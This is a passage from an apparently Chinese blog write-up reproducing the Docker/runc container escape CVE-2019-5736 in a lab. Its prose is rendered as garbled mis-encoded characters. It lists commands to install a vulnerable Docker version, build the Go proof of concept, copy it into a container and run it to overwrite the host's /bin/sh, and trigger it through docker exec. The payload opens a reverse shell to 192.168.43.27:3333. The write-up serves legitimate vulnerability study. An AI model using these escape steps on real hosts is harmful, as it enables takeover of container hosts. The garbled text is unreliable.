8e17å‘ç°å®¹å™¨å¯åŠ¨ä¸èµ·æ¥äº†ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2017.31.24.png" style="zoom:50%;"><p>ç§’é€€ã€‚</p><p>æŸ¥çœ‹dockeræœåŠ¡çŠ¶æ€ï¼Œå‘ç°dockeræ­£å¸¸è¿è¡Œï¼š</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2017.37.53.png" style="zoom:50%;"><p>é‡æ–°æ‰§è¡Œä¸€æ¬¡å¯åŠ¨å‘½ä»¤ï¼Œè¿˜æ˜¯å¤±è´¥ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2017.39.10.png" style="zoom:50%;"><p>æŸ¥çœ‹å®¹å™¨å¯åŠ¨çš„æ—¥å¿—ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> logs 8e17<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2017.46.05.png" style="zoom:50%;"><p>ä»æ—¥å¿—å¯ä»¥çœ‹å‡ºï¼Œç¡®å®æ˜¯æ‰§è¡Œdockerå®¹å™¨é€ƒé€¸æ”»å‡»å¯¼è‡´çš„é—®é¢˜ã€‚å› ä¸ºæœ¬åœ°çš„<code>/bin/sh</code>æ–‡ä»¶è¢«æ¶æ„æ›¿æ¢äº†ã€‚dockerå¯åŠ¨å®¹å™¨æ˜¯è°ƒç”¨runcè¿è¡Œæ—¶ç¯å¢ƒå¤±è´¥ï¼Œæ‰€ä»¥å®¹å™¨ä¹Ÿå°±æ— æ³•å¯åŠ¨äº†ã€‚æ‰€ä»¥ï¼Œè¦æ„è¯†åˆ°åšè™šæ‹Ÿæœºå¿«ç…§çš„é‡è¦æ€§ï¼Œå¯ä»¥çœå»å¾ˆå¤šéº»çƒ¦ã€‚</p></blockquote><p>é‡æ–°æ¢å¤è™šæ‹Ÿæœºç¯å¢ƒã€‚</p><p>é‡æ–°ç¼–è¯‘ä¸€ä¸‹POCï¼Œé‡ç‚¹æ³¨æ„ipç«¯å£å’Œæ‰§è¡Œçš„å‘½ä»¤ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>linux <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build main.go<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸Šä¼ è‡³/tmpç›®å½•ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2010.47.38.png" style="zoom:50%;"><p>ä¿®æ”¹æƒé™ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2010.49.00.png" style="zoom:50%;"><p>å³ä¾§æ˜¯å®¹å™¨ææƒåçš„rootæƒé™çš„shellã€‚</p><p>å·¦ä¾§ç›‘å¬è¿æ¥ï¼Œå¦‚æœèƒ½å¤Ÿç›‘å¬åˆ°è¿æ¥åˆ™è¡¨æ˜æˆåŠŸå®ç°äº†é€ƒé€¸ï¼Œè·å¾—äº†å®¿ä¸»æœºçš„shellã€‚</p><p>åœ¨å®¹å™¨çš„shellä¸­æ‰§è¡Œ./mainï¼Œè¦†ç›–å®¿ä¸»æœºçš„/bin/shæ–‡ä»¶ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2010.50.38.png" style="zoom:50%;"><p>ç„¶åç™»å½•web2ï¼Œæ¨¡æ‹Ÿç®¡ç†å‘˜ç”¨docker execè¿›å…¥å®¹å™¨ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2010.52.57.png" alt="æˆªå±2025-01-06 10.52.57" style="zoom:50%;"><p>å®¹å™¨root shellæç¤ºè·å–åˆ°æ–‡ä»¶å¥æŸ„ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2010.53.09.png" style="zoom:50%;"><p>ä½†æ˜¯æ²¡æœ‰è·å–åˆ°shellã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2010.53.54.png" style="zoom:40%;"><h2 id="2-5-å¤ç°å¤±è´¥"><a href="#2-5-å¤ç°å¤±è´¥" class="headerlink" title="2.5 å¤ç°å¤±è´¥"></a>2.5 å¤ç°å¤±è´¥</h2><p>ç›®å‰çš„ç¯å¢ƒæ—¶Ubuntu 14.04ï¼Œå¯èƒ½ç›®å‰çš„POCæ— æ³•èµ·ä½œç”¨ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2011.02.23.png" style="zoom:50%;"><p><code>Tested on Ubuntu 18.04, Debian 9, and Arch Linux. </code>ä½œè€…è¿™é‡Œæµ‹è¯•ç¯å¢ƒä¸åŒ…å«14.04ï¼Œå¯èƒ½è¿˜æ˜¯éœ€è¦æ­å»ºç¬¦åˆè¦æ±‚çš„ç¯å¢ƒæ‰èƒ½å®ç°ã€‚</p><h1 id="ä¸‰ã€æ¼æ´å¤ç°ï¼ˆcentos7å¤ç°æˆåŠŸï¼‰"><a href="#ä¸‰ã€æ¼æ´å¤ç°ï¼ˆcentos7å¤ç°æˆåŠŸï¼‰" class="headerlink" title="ä¸‰ã€æ¼æ´å¤ç°ï¼ˆcentos7å¤ç°æˆåŠŸï¼‰"></a>ä¸‰ã€æ¼æ´å¤ç°ï¼ˆcentos7å¤ç°æˆåŠŸï¼‰</h1><h2 id="3-1-å®éªŒç¯å¢ƒ"><a href="#3-1-å®éªŒç¯å¢ƒ" class="headerlink" title="3.1 å®éªŒç¯å¢ƒ"></a>3.1 å®éªŒç¯å¢ƒ</h2><h3 id="3-1-1-centos-7"><a href="#3-1-1-centos-7" class="headerlink" title="3.1.1 centos 7"></a>3.1.1 centos 7</h3><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2011.28.52.png" style="zoom:50%;"><h4 id="1ï¼‰å¸è½½å·²ç»å®‰è£…çš„Docker"><a href="#1ï¼‰å¸è½½å·²ç»å®‰è£…çš„Docker" class="headerlink" title="1ï¼‰å¸è½½å·²ç»å®‰è£…çš„Docker"></a>1ï¼‰å¸è½½å·²ç»å®‰è£…çš„Docker</h4><blockquote><p>1ï¼‰æ­¥éª¤ä¸€ï¼šæ€æ­»æ‰€æœ‰è¿è¡Œä¸­çš„å®¹å™¨ã€‚</p><p>é¦–å…ˆï¼Œç¡®ä¿æ²¡æœ‰ä»»ä½•å®¹å™¨åœ¨è¿è¡Œã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ€æ­»æ‰€æœ‰è¿è¡Œä¸­çš„å®¹å™¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">kill</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">-a</span> <span class="token parameter variable">-q</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2ï¼‰æ­¥éª¤äºŒï¼šåˆ é™¤æ‰€æœ‰ Docker å®¹å™¨</p><p>æ¥ä¸‹æ¥ï¼Œåˆ é™¤ç³»ç»Ÿä¸­æ‰€æœ‰å­˜åœ¨çš„ Docker å®¹å™¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">-a</span> <span class="token parameter variable">-q</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3ï¼‰æ­¥éª¤ä¸‰ï¼šåˆ é™¤æ‰€æœ‰ Docker é•œåƒ</p><p>ä¸ºäº†ç¡®ä¿ç³»ç»Ÿæ¸…æ´ï¼Œåˆ é™¤æ‰€æœ‰ Docker é•œåƒï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> rmi <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> images <span class="token parameter variable">-q</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ ä¸æ‰çš„åŠ -få‚æ•°</p><p>4ï¼‰æ­¥éª¤å››ï¼šåœæ­¢ Docker æœåŠ¡</p><p>åœ¨è¿›è¡Œä¸‹ä¸€æ­¥ä¹‹å‰ï¼Œç¡®ä¿åœæ­¢ Docker æœåŠ¡åŠå…¶ç›¸å…³çš„å¥—æ¥å­—ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl stop docker.socket<span class="token function">sudo</span> systemctl stop docker.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5ï¼‰æ­¥éª¤äº”ï¼šåˆ é™¤å­˜å‚¨ç›®å½•</p><p>Docker ä¼šåœ¨ç³»ç»Ÿä¸­åˆ›å»ºå¤šä¸ªå­˜å‚¨ç›®å½•ã€‚åˆ é™¤è¿™äº›ç›®å½•ä»¥å½»åº•æ¸…é™¤ Docker æ•°æ®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /etc/docker<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /run/docker<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /var/lib/dockershim<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /var/lib/docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>6ï¼‰æ­¥éª¤å…­ï¼šå¸è½½ Docker</p><p>æŸ¥çœ‹å·²å®‰è£…çš„ Docker åŒ…</p><p>é¦–å…ˆï¼Œæ£€æŸ¥ç³»ç»Ÿä¸Šå·²å®‰è£…çš„ Docker åŒ…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum list installed <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2011.41.54.png" style="zoom:50%;"><p>7ï¼‰å¸è½½ç›¸å…³åŒ…</p><p>ç„¶åï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¸è½½æ‰€æœ‰ä¸ Docker ç›¸å…³çš„åŒ…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum remove <span class="token parameter variable">-y</span> <span class="token string">'docker*'</span><span class="token function">sudo</span> yum remove <span class="token parameter variable">-y</span> containerd.io.x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œä½ å¯ä»¥åœ¨ CentOS 7 ç³»ç»Ÿä¸Šå½»åº•å¸è½½ Docker å’Œæ¸…ç†æ‰€æœ‰ç›¸å…³æ•°æ®ã€‚ç¡®ä¿æ¯ä¸ªæ­¥éª¤éƒ½æ­£ç¡®æ‰§è¡Œï¼Œä»¥é¿å…æ®‹ç•™æ•°æ®å½±å“åç»­æ“ä½œã€‚</p></blockquote><h4 id="2ï¼‰å®‰è£…ä½ç‰ˆæœ¬çš„docker"><a href="#2ï¼‰å®‰è£…ä½ç‰ˆæœ¬çš„docker" class="headerlink" title="2ï¼‰å®‰è£…ä½ç‰ˆæœ¬çš„docker"></a>2ï¼‰å®‰è£…ä½ç‰ˆæœ¬çš„docker</h4><ul><li>åˆ—å‡ºå¯ç”¨ç‰ˆæœ¬</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum list docker-ce <span class="token parameter variable">--showduplicates</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token parameter variable">-r</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2011.44.44.png" style="zoom:50%;"><ul><li>å®‰è£…æœ‰æ¼æ´ç‰ˆæœ¬&lt;=18.09.2ï¼Œè¿™é‡Œé€‰æ‹©18.06.0.ce-3.el7ç‰ˆæœ¬</li></ul><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.14.57.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> docker-ce-18.06.0.ce-3.el7 <span class="token parameter variable">-y</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.15.39.png" style="zoom:40%;"><ul><li>æŸ¥çœ‹ç‰ˆæœ¬</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token parameter variable">-v</span>docker-runc <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>çœ‹åˆ°dockerç‰ˆæœ¬ä¸º18.06.0.ce&lt;18.09.2ï¼Œruncç‰ˆæœ¬ä¸º1.0.0 rc5&lt;1.0-rc6ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.17.47.png" style="zoom:50%;"><p>æ³¨ï¼šé«˜ç‰ˆæœ¬dockerä¸­ä½¿ç”¨runc -væ¥runcæŸ¥ç‰ˆæœ¬ã€‚</p><ul><li>å¯åŠ¨docker</li></ul><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.20.10.png" style="zoom:40%;"><h3 id="3-1-2-æ¨¡æ‹Ÿå¤±é™·å®¹å™¨"><a href="#3-1-2-æ¨¡æ‹Ÿå¤±é™·å®¹å™¨" class="headerlink" title="3.1.2 æ¨¡æ‹Ÿå¤±é™·å®¹å™¨"></a>3.1.2 æ¨¡æ‹Ÿå¤±é™·å®¹å™¨</h3><p>æ¨¡æ‹Ÿå¯åŠ¨ä¸€ä¸ªè¢«æ”»å‡»å¤±é™·çš„å®¹å™¨ã€‚</p><p>åœ¨å—å®³è€…æœºå™¨ï¼ˆå³è¿™é‡Œçš„centos7 ï¼‰ä¸Šå¯åŠ¨ä¸€ä¸ªå®¹å™¨ ï¼Œæ­å»ºæ”»å‡»ç¯å¢ƒã€‚</p><h4 id="1ï¼‰æ‹‰å–é•œåƒ"><a href="#1ï¼‰æ‹‰å–é•œåƒ" class="headerlink" title="1ï¼‰æ‹‰å–é•œåƒ"></a>1ï¼‰æ‹‰å–é•œåƒ</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h3 id="å¤§æˆ˜bug-ã€Œæ‹‰å–é•œåƒå¤±è´¥ã€ï¼š"><a href="#å¤§æˆ˜bug-ã€Œæ‹‰å–é•œåƒå¤±è´¥ã€ï¼š" class="headerlink" title="å¤§æˆ˜bug-ã€Œæ‹‰å–é•œåƒå¤±è´¥ã€ï¼š"></a>å¤§æˆ˜bug-ã€Œæ‹‰å–é•œåƒå¤±è´¥ã€ï¼š</h3><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.21.01.png" style="zoom:50%;"><p>ä¹‹å‰å°±ç¢°åˆ°è¿‡ç±»ä¼¼çš„é—®é¢˜ï¼ŒåŸå› å°±æ˜¯dockerå®˜æ–¹ä»“åº“è¢«å¢™äº†ã€‚</p><p>è§£å†³ï¼š</p><p>æ ¸å¿ƒå°±æ˜¯æ‰¾åˆ°èƒ½ç”¨çš„é•œåƒä»“åº“ï¼Œç›®å‰å¯ç”¨çš„é…ç½®å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">tee</span> /etc/docker/daemon.json <span class="token operator">&lt;&lt;</span><span class="token string">EOF{    "registry-mirrors": ["https://docker.zhai.cm"]}EOF</span>systemctl daemon-reloadsystemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†å°è¯•æ‹‰å–ä¸€ä¸‹nginxé•œåƒã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.26.33.png" style="zoom:30%;"><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.27.36.png" style="zoom:40%;"><p>è¿˜æ˜¯æ‹‰å–ä¸ä¸‹æ¥ã€‚å¯ä»¥ç­‰ç­‰çœ‹ï¼Œå¦‚æœç«™ç‚¹ä¸é€šè¿‡ç§‘å­¦ä¸Šç½‘è¿˜èƒ½è®¿é—®çš„è¯åº”è¯¥é—®é¢˜ä¸å¤§ï¼Œæ‹‰å–çš„æ—¶å€™æ¯”è¾ƒéšç¼˜ï¼Œå¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.53.59.png" style="zoom:40%;"><p>ç­‰äº†åŠå¤©è¿˜æ˜¯æ‹‰å–ä¸ä¸‹æ¥ï¼Œè¿˜æ˜¯è¯´ä¸å‡†å“ªé‡Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚éœ€è¦ä¸æ–­å¯»æ‰¾èƒ½ç”¨çš„ä»“åº“ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span>  <span class="token string">"registry-mirrors"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>    <span class="token string">"https://docker.hpcloud.cloud"</span>, <span class="token string">"https://docker.m.daocloud.io"</span>, <span class="token string">"https://docker.unsee.tech"</span>, <span class="token string">"https://docker.1panel.live"</span>, <span class="token string">"http://mirrors.ustc.edu.cn"</span>, <span class="token string">"https://docker.chenby.cn"</span>, <span class="token string">"http://mirror.azure.cn"</span>, <span class="token string">"https://dockerpull.org"</span>, <span class="token string">"https://dockerhub.icu"</span>, <span class="token string">"https://hub.rat.dev"</span>, <span class="token string">"https://proxy.1panel.live"</span>, <span class="token string">"https://docker.1panel.top"</span>, <span class="token string">"https://docker.m.daocloud.io"</span>, <span class="token string">"https://docker.1ms.run"</span>, <span class="token string">"https://docker.ketches.cn"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é…ç½®ä¸Šé¢çš„ä»“åº“åœ°å€è¿˜æ˜¯æ— æ³•æ‹‰å–ï¼ŒæŠ˜ç£¨ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>åé¢è€å¿ƒå¤šå°è¯•äº†å‡ æ¬¡åˆå¯ä»¥äº†ï¼Œéº»ï¼</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.28.32.png" style="zoom:40%;"></blockquote><h4 id="2ï¼‰è¿è¡Œå®¹å™¨"><a href="#2ï¼‰è¿è¡Œå®¹å™¨" class="headerlink" title="2ï¼‰è¿è¡Œå®¹å™¨"></a>2ï¼‰è¿è¡Œå®¹å™¨</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">--name</span> nginx-test <span class="token parameter variable">-p</span> <span class="token number">8080</span>:80 <span class="token parameter variable">-d</span> nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.30.29.png" style="zoom:50%;"><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.31.14.png" style="zoom:40%;"><h3 id="3-1-3-æ”»å‡»æœº"><a href="#3-1-3-æ”»å‡»æœº" class="headerlink" title="3.1.3 æ”»å‡»æœº"></a>3.1.3 æ”»å‡»æœº</h3><p>kali linuxï¼šip 192.168.52.5</p><h2 id="3-2-æ¼æ´å¤ç°"><a href="#3-2-æ¼æ´å¤ç°" class="headerlink" title="3.2 æ¼æ´å¤ç°"></a>3.2 æ¼æ´å¤ç°</h2><p>å‰æï¼šå‡å®šæ”»å‡»è€…å·²ç»æ‹¿ä¸‹å®¹å™¨çš„rootæƒé™ï¼ˆä¸€èˆ¬æ”»å‡»è€…ä¼šé€šè¿‡webshell+ææƒçš„æ–¹å¼å®ç°è¿™ä¸€ç›®æ ‡ï¼Œå‚è€ƒæœ¬ç«™ã€Š ä¸‰å±‚ç½‘ç»œé¶åœº(WHOAMI)ä»æ‰“ç‚¹åˆ°æ‹¿ä¸‹åŸŸæ§ã€‹ä¸€æ–‡ï¼‰ã€‚</p><p>ç›®æ ‡ï¼šé€šè¿‡Runcé€ƒé€¸æ¼æ´æ‹¿ä¸‹å®¿ä¸»æœºçš„rootæƒé™ã€‚</p><h3 id="3-2-1-æ¶æ„è„šæœ¬ç¼–è¯‘"><a href="#3-2-1-æ¶æ„è„šæœ¬ç¼–è¯‘" class="headerlink" title="3.2.1 æ¶æ„è„šæœ¬ç¼–è¯‘"></a>3.2.1 æ¶æ„è„šæœ¬ç¼–è¯‘</h3><p>è¿™ä¸ªè¿‡ç¨‹è·Ÿ2.2 èŠ‚ä¸€æ ·ï¼Œä¸èµ˜è¿°ã€‚</p><p>payloadæ‰§è¡Œååå¼¹çš„shellè¿æ¥çš„ç›®æ ‡åœ°å€ä¸º <code>192.168.43.27:3333</code>ã€‚</p><h3 id="3-2-2-å°†payloadä¼ å…¥å¤±é™·çš„å®¹å™¨ä¸­"><a href="#3-2-2-å°†payloadä¼ å…¥å¤±é™·çš„å®¹å™¨ä¸­" class="headerlink" title="3.2.2 å°†payloadä¼ å…¥å¤±é™·çš„å®¹å™¨ä¸­"></a>3.2.2 å°†payloadä¼ å…¥å¤±é™·çš„å®¹å™¨ä¸­</h3><p>å°†è¯¥payload(mainæ–‡ä»¶)æ‹·è´åˆ°dockerå®¹å™¨ä¸­ï¼ˆè¿™å°±æ˜¯æ¨¡æ‹Ÿæ”»å‡»è€…è·å–äº†dockerå®¹å™¨æƒé™ï¼Œåœ¨å®¹å™¨ä¸­ä¸Šä¼ payloadè¿›è¡Œdockeré€ƒé€¸ï¼‰å¹¶å°†mainæ–‡ä»¶ä¿®æ”¹æƒé™å¯æ‰§è¡Œã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">cp</span> main 59f2:/home<span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> 59f2 /bin/sh<span class="token builtin class-name">cd</span> home<span class="token function">chmod</span> <span class="token number">777</span> main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.52.53.png" style="zoom:50%;"><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.54.04.png" style="zoom:40%;"><h3 id="3-2-3-å‘èµ·æ”»å‡»"><a href="#3-2-3-å‘èµ·æ”»å‡»" class="headerlink" title="3.2.3 å‘èµ·æ”»å‡»"></a>3.2.3 å‘èµ·æ”»å‡»</h3><h4 id="1ï¼‰æ‰§è¡Œ-main"><a href="#1ï¼‰æ‰§è¡Œ-main" class="headerlink" title="1ï¼‰æ‰§è¡Œ./main"></a>1ï¼‰æ‰§è¡Œ./main</h4><p>è¿™ä¸€æ­¥çš„ç›®çš„æ˜¯æ‰§è¡Œpayloadè¦†ç›–å®¿ä¸»æœºçš„/bin/shã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.56.27.png" style="zoom:50%;"><h4 id="2ï¼‰æ”»å‡»è€…ç›‘å¬åå¼¹çš„shell"><a href="#2ï¼‰æ”»å‡»è€…ç›‘å¬åå¼¹çš„shell" class="headerlink" title="2ï¼‰æ”»å‡»è€…ç›‘å¬åå¼¹çš„shell"></a>2ï¼‰æ”»å‡»è€…ç›‘å¬åå¼¹çš„shell</h4><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.57.20.png" style="zoom:40%;"><h4 id="3ï¼‰æ¨¡æ‹Ÿå—å®³è€…è¿›å…¥å®¹å™¨è§¦å‘payload"><a href="#3ï¼‰æ¨¡æ‹Ÿå—å®³è€…è¿›å…¥å®¹å™¨è§¦å‘payload" class="headerlink" title="3ï¼‰æ¨¡æ‹Ÿå—å®³è€…è¿›å…¥å®¹å™¨è§¦å‘payload"></a>3ï¼‰æ¨¡æ‹Ÿå—å®³è€…è¿›å…¥å®¹å™¨è§¦å‘payload</h4><p>é‡æ–°æ‰“å¼€ä¸€ä¸ªsshä¼šè¯ï¼Œæ‰§è¡Œè¿›å…¥å®¹å™¨çš„å‘½ä»¤ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> 59f2 /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.59.31.png" style="zoom:50%;"><p>è§‚å¯Ÿå®¹å™¨shellä¼šè¯çš„æ˜¾ç¤ºï¼š</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2015.00.36.png" style="zoom:50%;"><p>æ”»å‡»æˆåŠŸã€‚</p><h4 id="4ï¼‰æ”»å‡»ä¾§å¼¹å›çš„shell"><a href="#4ï¼‰æ”»å‡»ä¾§å¼¹å›çš„shell" class="headerlink" title="4ï¼‰æ”»å‡»ä¾§å¼¹å›çš„shell"></a>4ï¼‰æ”»å‡»ä¾§å¼¹å›çš„shell</h4><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2015.03.39.png" style="zoom:50%;"><p>å‘ç°æ²¡æœ‰åå¼¹å›shellã€‚</p><p>åŸå› åˆ†æï¼škalié‡‡ç”¨äº†æ¡¥æ¥æ–¹å¼ï¼Œåœ¨192.168.43.27/24ç½‘æ®µï¼Œcentos7å—å®³æœºåœ¨192.168.52.4/24ç½‘æ®µã€‚æ— 